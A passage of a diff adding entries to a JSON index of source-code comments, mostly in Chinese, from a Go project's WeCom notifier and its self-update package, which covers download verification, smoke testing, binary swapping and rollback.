+    "path": "source/notify/wecom.go",
+    "Start": 174,
+    "End": 267,
+    "Line": 11,
+    "Text": "// 这是全部六个渠道里最紧的限制，也是 TruncateBytes 存在的主要原因。"
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 301,
+    "End": 350,
+    "Line": 14,
+    "Text": "// weComChannel 实现企业微信群机器人。"
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 354,
+    "End": 372,
+    "Line": 16,
+    "Text": "// 平台特性："
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 373,
+    "End": 486,
+    "Line": 17,
+    "Text": "//   - 唯一通过 URL 上的 key 鉴权，不支持加签——所以 webhook 地址本身就是全部凭据。"
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 487,
+    "End": 597,
+    "Line": 18,
+    "Text": "//   - markdown content 上限 4096 **字节**，超长整条被拒（不是截断）。中文 3 字节/字，"
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 598,
+    "End": 671,
+    "Line": 19,
+    "Text": "//     意味着正文只有一千多字可写，必须客户端截断。"
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 672,
+    "End": 735,
+    "Line": 20,
+    "Text": "//   - 限流 20 条/分钟，同样靠客户端限流兜住。"
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 879,
+    "End": 971,
+    "Line": 27,
+    "Text": "// 企业微信只有 Webhook 一处凭据（URL 上的 key），且它不支持加签——"
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 972,
+    "End": 1041,
+    "Line": 28,
+    "Text": "// 整个地址就是全部凭据，没有别的字段需要掩码。"
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 1116,
+    "End": 1242,
+    "Line": 31,
+    "Text": "// 企微只有 Webhook 一处字段，它既是目的地也是凭据，因此没有「改地址后残留的凭据」可言。"
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 1760,
+    "End": 1850,
+    "Line": 49,
+    "Text": "// 汇总批可能很长（50 条 × 每条一行 + 前缀），4096 字节很容易超。"
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 1852,
+    "End": 1969,
+    "Line": 50,
+    "Text": "// 截断在这里做而不是靠平台报错：被拒意味着这一批全丢，而截断至少送达前若干条。"
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 2493,
+    "End": 2598,
+    "Line": 68,
+    "Text": "// 45009 是接口调用超过限制——平台的限流窗口会滚动，退避后重试是有效的，"
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 2601,
+    "End": 2696,
+    "Line": 69,
+    "Text": "// 所以显式归为可重试。走到这里说明客户端 rate_per_min 配得过于激进，"
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 2699,
+    "End": 2771,
+    "Line": 70,
+    "Text": "// 重试只是兜底，真正的修法是调低该渠道的限流值。"
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 2882,
+    "End": 2955,
+    "Line": 74,
+    "Text": "// 93000 是 webhook key 无效——永久失败，重试不会自愈。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 142,
+    "End": 215,
+    "Line": 17,
+    "Text": "// smokeEnv 让被冒烟测试拉起的子进程直接跳过 Bootstrap。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 219,
+    "End": 318,
+    "Line": 19,
+    "Text": "// 严格来说不加也不会出事：子进程的 os.Executable() 是 artex.new，推导出来的"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 319,
+    "End": 421,
+    "Line": 20,
+    "Text": "// 全部路径都带 .new 前缀，碰不到真正的升级文件。但依赖这种巧合太脆弱，"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 422,
+    "End": 500,
+    "Line": 21,
+    "Text": "// 显式短路一目了然，也省掉子进程一次无谓的磁盘探测。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 544,
+    "End": 589,
+    "Line": 24,
+    "Text": "// Action 是 Bootstrap 给 main 的指令。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 616,
+    "End": 652,
+    "Line": 28,
+    "Text": "// Continue：照常启动 server。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 678,
+    "End": 752,
+    "Line": 30,
+    "Text": "// Restart：立刻以 ExitRestart 退出，让守护脚本重新拉起。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 765,
+    "End": 853,
+    "Line": 34,
+    "Text": "// State 描述本次启动时的升级状态，供 /api/update/check 如实告诉前端"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 854,
+    "End": 907,
+    "Line": 35,
+    "Text": "// \"上一次升级是成功了还是被回滚了\"。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 1211,
+    "End": 1314,
+    "Line": 43,
+    "Text": "// Bootstrap 在 main 的最开头运行，必须在任何监听端口、打开数据库之前调用。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 1318,
+    "End": 1336,
+    "Line": 45,
+    "Text": "// 三种局面："
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 1340,
+    "End": 1462,
+    "Line": 47,
+    "Text": "//\t① 存在暂存件 artex.new  → 校验 + 冒烟，通过则换装并要求重启；不通过则丢弃继续跑旧版"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 1463,
+    "End": 1574,
+    "Line": 48,
+    "Text": "//\t② 只剩标记文件          → 说明刚换装完，累计一次尝试；连续失败够多次则回滚"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 1575,
+    "End": 1625,
+    "Line": 49,
+    "Text": "//\t③ 什么都没有            → 正常启动"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 2026,
+    "End": 2118,
+    "Line": 71,
+    "Text": "// applyStaged 处理\"存在暂存件\"的局面：校验通过就换装，失败就丢弃。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 2122,
+    "End": 2242,
+    "Line": 73,
+    "Text": "// 这里是整个升级链路唯一会覆盖可执行文件的地方，也是最后一道闸门——冒烟测试挡掉"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 2243,
+    "End": 2354,
+    "Line": 74,
+    "Text": "// 下载损坏、架构选错、动态链接缺失这类问题。一旦放行一个跑不起来的二进制，"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 2355,
+    "End": 2476,
+    "Line": 75,
+    "Text": "// 守护脚本会不知疲倦地反复拉起它，而 Go 代码根本没机会运行，自动回滚也就无从谈起。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 3138,
+    "End": 3237,
+    "Line": 93,
+    "Text": "// 换装成功。保留标记，交给下一次启动（跑的就是新版）确认是否稳定。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 3605,
+    "End": 3706,
+    "Line": 105,
+    "Text": "// confirmOrRollback 处理\"换装后的启动\"：累计尝试次数，超限则把旧版换回来。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 3710,
+    "End": 3812,
+    "Line": 107,
+    "Text": "// 计数只在 Go 代码跑起来后才递增，所以它覆盖的是\"能执行但初始化时崩溃\""
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 3813,
+    "End": 3920,
+    "Line": 108,
+    "Text": "// （配置不兼容、端口被占、DB 迁移炸了）这类故障；\"根本无法 exec\" 由换装前的"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 3921,
+    "End": 3978,
+    "Line": 109,
+    "Text": "// 冒烟测试挡住，两者合起来才是完整的。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 4125,
+    "End": 4212,
+    "Line": 114,
+    "Text": "// 回滚都失败了就别再重启了，否则会陷入无限重启。清掉标记，"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 4216,
+    "End": 4309,
+    "Line": 115,
+    "Text": "// 让进程按当前状态起——起不来的话用户至少能在日志里看到原因。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 5202,
+    "End": 5266,
+    "Line": 133,
+    "Text": "// Settle 确认新版本已稳定运行，清除升级标记。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 5270,
+    "End": 5381,
+    "Line": 135,
+    "Text": "// 由 main 在 HTTP 监听起来之后延迟调用：活过这段时间才算数，否则标记留在原地，"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 5382,
+    "End": 5445,
+    "Line": 136,
+    "Text": "// 下次启动继续累计尝试次数，直到触发回滚。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 5913,
+    "End": 5984,
+    "Line": 156,
+    "Text": "// SettleDelay 是判定\"新版本活下来了\"所需的运行时长。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 6023,
+    "End": 6112,
+    "Line": 159,
+    "Text": "// verifyStaged 校验暂存件：先比对 SHA256，再真正把它拉起来跑一次。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 6518,
+    "End": 6604,
+    "Line": 175,
+    "Text": "// smokeTest 用 -h 拉起新二进制，确认它在当前系统上真的能执行。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 6605,
+    "End": 6703,
+    "Line": 176,
+    "Text": "// 这能挡掉下载截断、架构选错（exec format error）、缺依赖等一大类问题。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 7366,
+    "End": 7419,
+    "Line": 200,
+    "Text": "// swap 把当前二进制换成暂存的新版本。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 7423,
+    "End": 7528,
+    "Line": 202,
+    "Text": "// Unix 和 Windows 都允许 rename 一个正在运行的可执行文件（Windows 禁止的是删除和"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 7529,
+    "End": 7629,
+    "Line": 203,
+    "Text": "// 覆盖，rename 不在其列），所以这里不需要分平台，也不需要先停掉自己。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 7658,
+    "End": 7761,
+    "Line": 205,
+    "Text": "// Windows 的 rename 不会覆盖已存在的目标，上一轮升级留下的 .old 必须先清掉。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 8071,
+    "End": 8188,
+    "Line": 213,
+    "Text": "// 换装失败但当前版本已经被挪走了，必须原样放回去，否则下次启动没有可执行文件。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 8454,
+    "End": 8505,
+    "Line": 223,
+    "Text": "// rollback 把 swap 备份的旧版本换回来。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 8659,
+    "End": 8737,
+    "Line": 228,
+    "Text": "// 把起不来的新版挪到 .failed 留作排查，而不是直接删掉。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 9032,
+    "End": 9108,
+    "Line": 240,
+    "Text": "// Rollback 是 /api/update/rollback 的实现：主动退回上一版本。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 9109,
+    "End": 9203,
+    "Line": 241,
+    "Text": "// 只做换装，重启同样交给守护脚本（调用方随后以 ExitRestart 退出）。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 9575,
+    "End": 9635,
+    "Line": 254,
+    "Text": "// 交换当前与备份：回滚之后还能再滚回来。"
+  },
+  {
+    "path": "source/selfupdate/bootstrap.go",
+    "Start": 10130,
+    "End": 10233,
+    "Line": 271,
+    "Text": "// HasBackup 报告是否存在可回滚的上一版本，供前端决定要不要显示回滚按钮。"
+  },
+  {
+    "path": "source/selfupdate/github.go",
+    "Start": 1226,
+    "End": 1313,
+    "Line": 35,
+    "Text": "// allowedHosts 限定升级链路能访问的域名。配合下面的 checkRedirect，"
+  },
+  {
+    "path": "source/selfupdate/github.go",
+    "Start": 1314,
+    "End": 1421,
+    "Line": 36,
+    "Text": "// 任何一跳被重定向到名单外的主机都会直接失败——这是防止 DNS 污染 / 中间人"
+  },
+  {
+    "path": "source/selfupdate/github.go",
+    "Start": 1422,
+    "End": 1497,
+    "Line": 37,
+    "Text": "// 把二进制换掉的第一道闸门，第二道是 SHA256SUMS 比对。"
+  },
+  {
+    "path": "source/selfupdate/github.go",
+    "Start": 1813,
+    "End": 1870,
+    "Line": 46,
+    "Text": "// Release 是 GitHub Release 里我们关心的字段。"
+  },
+  {
+    "path": "source/selfupdate/github.go",
+    "Start": 2217,
+    "End": 2262,
+    "Line": 58,
+    "Text": "// Asset 是 Release 上挂的一个文件。"
+  },
+  {
+    "path": "source/selfupdate/github.go",
+    "Start": 2383,
+    "End": 2473,
+    "Line": 65,
+    "Text": "// NewClient 构造一个只认 GitHub 域名的 HTTP 客户端。proxy 为空则直连。"
+  },
+  {
+    "path": "source/selfupdate/github.go",
+    "Start": 2477,
+    "End": 2579,
+    "Line": 67,
+    "Text": "// 刻意不复用默认 Transport：升级链路必须强制走 TLS 且校验证书，不能被别处"
+  },
+  {
+    "path": "source/selfupdate/github.go",
+    "Start": 2580,
+    "End": 2630,
+    "Line": 68,
+    "Text": "// 设置的 InsecureSkipVerify 之类影响到。"
+  },
+  {
+    "path": "source/selfupdate/github.go",
+    "Start": 3223,
+    "End": 3268,
+    "Line": 91,
+    "Text": "// checkURL 强制 https + 域名白名单。"
+  },
+  {
+    "path": "source/selfupdate/github.go",
+    "Start": 3540,
+    "End": 3579,
+    "Line": 102,
+    "Text": "// FetchLatest 查询最新正式版。"
+  },
+  {
+    "path": "source/selfupdate/github.go",
+    "Start": 4390,
+    "End": 4483,
+    "Line": 128,
+    "Text": "// 未认证的 GitHub API 是每 IP 每小时 60 次，共用出口 IP 时很容易撞上。"
+  },
+  {
+    "path": "source/selfupdate/github.go",
+    "Start": 5085,
+    "End": 5187,
+    "Line": 146,
+    "Text": "// AssetName 返回当前平台对应的发布包名，与 build.sh 的 package_binary 保持一致："
+  },
+  {
+    "path": "source/selfupdate/github.go",
+    "Start": 5188,
+    "End": 5254,
+    "Line": 147,
+    "Text": "// artex-<版本>-<os>-<arch>.zip（版本号不带 v 前缀）。"
+  },
+  {
+    "path": "source/selfupdate/github.go",
+    "Start": 5394,
+    "End": 5443,
+    "Line": 152,
+    "Text": "// FindAsset 在 Release 里按名字找资产。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 0,
+    "End": 94,
+    "Line": 1,
+    "Text": "// Package selfupdate implements ARTEX 的页面一键更新：从 GitHub Release 拉取新版"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 95,
+    "End": 164,
+    "Line": 2,
+    "Text": "// 二进制、校验、暂存，并在下次启动时原子换装。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 168,
+    "End": 216,
+    "Line": 4,
+    "Text": "// 整体分工（见 start.sh / start.bat）："
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 220,
+    "End": 319,
+    "Line": 6,
+    "Text": "//\t启动脚本  = 傻瓜守护循环，只负责\"进程退出后按退出码决定是否再拉起\""
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 320,
+    "End": 416,
+    "Line": 7,
+    "Text": "//\t本包      = 全部易错逻辑（下载 / SHA256 校验 / 冒烟 / 换装 / 失败回滚）"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 420,
+    "End": 528,
+    "Line": 9,
+    "Text": "// 之所以把换装放在 Go 而不是脚本里，是因为 sha256 校验和冒烟测试在 sh 和 bat 上"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 529,
+    "End": 639,
+    "Line": 10,
+    "Text": "// 要写两套（sha256sum / shasum / certutil），而这恰恰是最不能出错的一环——换上一个"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 640,
+    "End": 745,
+    "Line": 11,
+    "Text": "// 跑不起来的二进制，守护进程会忠实地反复拉起它，用户只能上机器手工救。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 749,
+    "End": 797,
+    "Line": 13,
+    "Text": "// 一次完整升级经过三次进程启动："
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 801,
+    "End": 896,
+    "Line": 15,
+    "Text": "//\t① 旧版 server 收到 /api/update/apply → 下载校验 → 暂存 artex.new → exit 75"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 897,
+    "End": 1000,
+    "Line": 16,
+    "Text": "//\t② 脚本重新拉起旧版 → Bootstrap 发现 artex.new → 校验+冒烟 → 换装 → exit 75"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 1001,
+    "End": 1109,
+    "Line": 17,
+    "Text": "//\t③ 脚本重新拉起，此时已是新版 → Bootstrap 记一次尝试 → 启动成功后清除标记"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 1113,
+    "End": 1229,
+    "Line": 19,
+    "Text": "// 任何一步失败都退回旧版：② 校验不过就删掉暂存件继续跑旧版；③ 连续 3 次没活到"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 1230,
+    "End": 1301,
+    "Line": 20,
+    "Text": "// 清除标记（起不来就崩）则自动把 artex.old 换回去。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 1403,
+    "End": 1506,
+    "Line": 32,
+    "Text": "// ExitRestart 是\"请守护进程重新拉起我\"的退出码（EX_TEMPFAIL）。启动脚本看到它"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 1507,
+    "End": 1629,
+    "Line": 33,
+    "Text": "// 就立刻重跑，不计入崩溃退避。0 表示用户正常停止（脚本退出循环），其余均视为崩溃。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 1654,
+    "End": 1756,
+    "Line": 36,
+    "Text": "// maxAttempts 是换装后允许的启动尝试次数。新版每次启动都会把计数 +1，活过"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 1757,
+    "End": 1857,
+    "Line": 37,
+    "Text": "// settleDelay 则清除标记；连崩 maxAttempts 次说明新版根本起不来，自动回滚。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 1881,
+    "End": 1971,
+    "Line": 40,
+    "Text": "// Paths 是一次升级涉及的全部文件，统一挂在**Executable directory**下。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 1972,
+    "End": 2083,
+    "Line": 41,
+    "Text": "// 刻意不用 CWD：服务化运行时工作目录可能是 / 或任意路径，用 CWD 会让暂存件落到"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 2084,
+    "End": 2123,
+    "Line": 42,
+    "Text": "// 别处，换装逻辑直接失效。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 2589,
+    "End": 2656,
+    "Line": 52,
+    "Text": "// ResolvePaths 按当前可执行文件推导全部升级路径。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 2660,
+    "End": 2766,
+    "Line": 54,
+    "Text": "// Windows 上 .new/.old 也必须带 .exe 后缀，否则冒烟测试和换装后的执行都会失败，"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 2767,
+    "End": 2836,
+    "Line": 55,
+    "Text": "// 所以先把后缀摘掉再拼，两个平台的命名才对称。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 3510,
+    "End": 3598,
+    "Line": 80,
+    "Text": "// marker 记录一次换装的进度，用来在新版起不来时触发自动回滚。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 4226,
+    "End": 4328,
+    "Line": 108,
+    "Text": "// cleanStaged 清掉暂存件。换装成功、校验失败、用户取消都走它，避免残留的"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 4329,
+    "End": 4378,
+    "Line": 109,
+    "Text": "// artex.new 在下次启动时被重新尝试。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 4454,
+    "End": 4535,
+    "Line": 115,
+    "Text": "// CompareVersions 比较两个版本号，返回 -1/0/1（a<b / a==b / a>b）。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 4536,
+    "End": 4633,
+    "Line": 116,
+    "Text": "// ok=false 表示至少一边不是可比较的版本号（例如本地开发构建的 \"dev\" 或"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 4634,
+    "End": 4729,
+    "Line": 117,
+    "Text": "// git describe 产出的 \"0.3.7-2-gabc1234-dirty\"），此时调用方应禁用一键更新，"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 4730,
+    "End": 4816,
+    "Line": 118,
+    "Text": "// 否则会把开发中的构建\"升级\"成正式版、覆盖掉未提交的改动。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 5094,
+    "End": 5167,
+    "Line": 136,
+    "Text": "// parseVersion 解析 \"v0.3.7\" / \"0.3.7\" 形式的版本号为 [3]int。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 5171,
+    "End": 5256,
+    "Line": 138,
+    "Text": "// 只接受纯净的三段式：build.sh 在非 tag 构建时用 git describe 产出"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 5257,
+    "End": 5360,
+    "Line": 139,
+    "Text": "// \"0.3.7-2-gabc1234\" 这类带后缀的版本，它们必须被判为不可比较，而不是被当成"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 5361,
+    "End": 5448,
+    "Line": 140,
+    "Text": "// 0.3.7 —— 否则开发构建会被误判为\"已是最新\"或被正式版覆盖。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 5841,
+    "End": 5932,
+    "Line": 162,
+    "Text": "// InDocker 报告进程是否跑在容器里。Docker 下换装写的是容器可写层，"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 5933,
+    "End": 6025,
+    "Line": 163,
+    "Text": "// `docker compose up -d` 重建容器会退回镜像自带的版本——这是预期行为"
+  },
+  {
+    "path": "source/selfupdate/selfupdate.go",
+    "Start": 6026,
+    "End": 6113,
+    "Line": 164,
+    "Text": "// （那时用户本来就在拉新镜像），但前端要能据此把话说清楚。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 114,
+    "End": 214,
+    "Line": 13,
+    "Text": "// testPaths 造一个隔离的升级目录。不能直接用 ResolvePaths()——那会指向测试"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 215,
+    "End": 287,
+    "Line": 14,
+    "Text": "// 二进制本身，一跑就把 go test 的可执行文件改名了。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 626,
+    "End": 729,
+    "Line": 28,
+    "Text": "// fakeBin 写一个可执行的壳脚本冒充 artex。smokeTest 只是用 -h 拉起它看退出码，"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 730,
+    "End": 799,
+    "Line": 29,
+    "Text": "// 脚本完全够用，而且比编译一个真二进制快得多。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 1163,
+    "End": 1259,
+    "Line": 45,
+    "Text": "// stage 把 bin 布置成\"已暂存待换装\"的样子：写好 artex.new 和它的校验和。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 2142,
+    "End": 2192,
+    "Line": 83,
+    "Text": "// build.sh 去掉 v，tag 带 v，两边都要认"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 2258,
+    "End": 2291,
+    "Line": 85,
+    "Text": "// 按数字比而不是字典序"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 2327,
+    "End": 2420,
+    "Line": 87,
+    "Text": "// 开发构建必须判为不可比较，否则会被正式版覆盖掉未提交的改动。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 3030,
+    "End": 3134,
+    "Line": 111,
+    "Text": "// 关键不变量：所有升级文件都和可执行文件同目录。落到 CWD 会让服务化运行"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 3136,
+    "End": 3195,
+    "Line": 112,
+    "Text": "// （工作目录可能是 /）时的换装彻底失效。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 3430,
+    "End": 3529,
+    "Line": 118,
+    "Text": "// Windows 上 .new/.old 必须保留 .exe，否则冒烟测试和换装后的执行都会失败。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 3857,
+    "End": 3932,
+    "Line": 131,
+    "Text": "// 校验和写好之后再改动文件，模拟下载损坏 / 被掉包。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 4197,
+    "End": 4226,
+    "Line": 141,
+    "Text": "// 能执行但退出码非 0"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 5173,
+    "End": 5266,
+    "Line": 176,
+    "Text": "// 标记必须留着，下一次启动（跑的是新版）靠它计数、必要时回滚。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 5547,
+    "End": 5565,
+    "Line": 187,
+    "Text": "// 破坏校验和"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 6162,
+    "End": 6195,
+    "Line": 208,
+    "Text": "// 上一轮升级留下的备份"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 6685,
+    "End": 6764,
+    "Line": 229,
+    "Text": "// 前 maxAttempts 次启动只累计计数，让新版有机会自己站稳。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 7199,
+    "End": 7253,
+    "Line": 245,
+    "Text": "// 再崩一次就超限，自动把旧版换回来。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 7678,
+    "End": 7735,
+    "Line": 259,
+    "Text": "// 起不来的那个版本留作排查，不直接删。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 8009,
+    "End": 8083,
+    "Line": 271,
+    "Text": "// Rollback() 走 ResolvePaths()，这里直接测底层的交换语义。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 8748,
+    "End": 8846,
+    "Line": 295,
+    "Text": "// sha256sum 输出是双空格分隔；shasum -a 256 在二进制模式下会给文件名加 *。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 8981,
+    "End": 9029,
+    "Line": 299,
+    "Text": "// 恰好两个字段，但第一个不是摘要"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 9075,
+    "End": 9096,
+    "Line": 300,
+    "Text": "// 摘要长度不对"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 9226,
+    "End": 9301,
+    "Line": 306,
+    "Text": "// 摘要统一小写，比对时才不会因大小写误判为不匹配。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 9917,
+    "End": 10009,
+    "Line": 327,
+    "Text": "// 真实发布包的结构：artex-<版本>-<os>-<arch>/artex，外加若干干扰文件。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 11487,
+    "End": 11499,
+    "Line": 383,
+    "Text": "// 非 HTTPS"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 11535,
+    "End": 11559,
+    "Line": 384,
+    "Text": "// 域名不在白名单"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 11595,
+    "End": 11610,
+    "Line": 385,
+    "Text": "// 后缀伪装"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 11952,
+    "End": 11979,
+    "Line": 397,
+    "Text": "// 域名大小写不敏感"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 12205,
+    "End": 12291,
+    "Line": 408,
+    "Text": "// build.sh 的 package_binary 用的是 artex-<版本>-<os>-<arch>.zip，且版本号"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 12293,
+    "End": 12395,
+    "Line": 409,
+    "Text": "// 去掉了 v 前缀。这里对错一个字符，所有平台的一键更新都会找不到资产。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 13211,
+    "End": 13301,
+    "Line": 441,
+    "Text": "// 标记没了，后续正常重启就不会再累计次数、也不会误触发回滚。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 13381,
+    "End": 13429,
+    "Line": 445,
+    "Text": "// 备份要留着，用户还能手动回滚。"
+  },
+  {
+    "path": "source/selfupdate/selfupdate_test.go",
+    "Start": 13668,
+    "End": 13729,
+    "Line": 455,
+    "Text": "// 普通启动路径，不该 panic 也不该动任何文件"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 160,
+    "End": 247,
+    "Line": 18,
+    "Text": "// sumsAsset 是 release.yml 生成的校验和清单，覆盖 Release 里全部 zip。"
+  },
+  {
